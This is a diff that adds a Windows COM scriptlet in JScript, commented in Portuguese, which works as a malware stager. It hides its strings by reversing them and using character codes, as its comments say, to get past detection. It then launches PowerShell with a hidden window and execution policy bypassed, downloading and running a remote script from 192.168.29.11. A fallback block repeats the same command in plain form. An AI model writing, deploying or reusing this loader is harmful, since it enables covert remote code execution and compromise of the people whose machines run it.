@@ -1,0 +1,31 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="TESTING" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
+<script language="JScript">
+<![CDATA[
+    try {
+        // Técnica de ofuscação de strings
+        function d(s){return s.split('').reverse().join('');}
+        var p = d("exe.llehsrewop");
+        var c = d("ssapyB-yciloPlanoitucexE-");
+        var h = d("neddiH-elytSwodniW-");
+
+        // Contornar detecção de strings
+        var cmd = String.fromCharCode(73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,83,116,114,105,110,103,40,39,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,50,57,46,49,49,47,116,101,115,116,101,46,112,115,49,39,41);
+
+        // Execução direta - método mais confiável
+        var a = new ActiveXObject(d("llehS.tpircSW"));
+        var x = a.ExpandEnvironmentStrings(d("%RIDNIW%"));
+        var e = x + d("23metsyS\\");
+
+        // Execução usando método direto
+        a.Run(e + p + " " + h + " " + c + " -Command \"" + cmd + "\"", 0, false);
+    } catch(e) {
+        // Método alternativo mais simples
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.29.11/teste.ps1')\"", 0, false);
+    }
+]]>
+</script>
+</registration>
+</scriptlet>
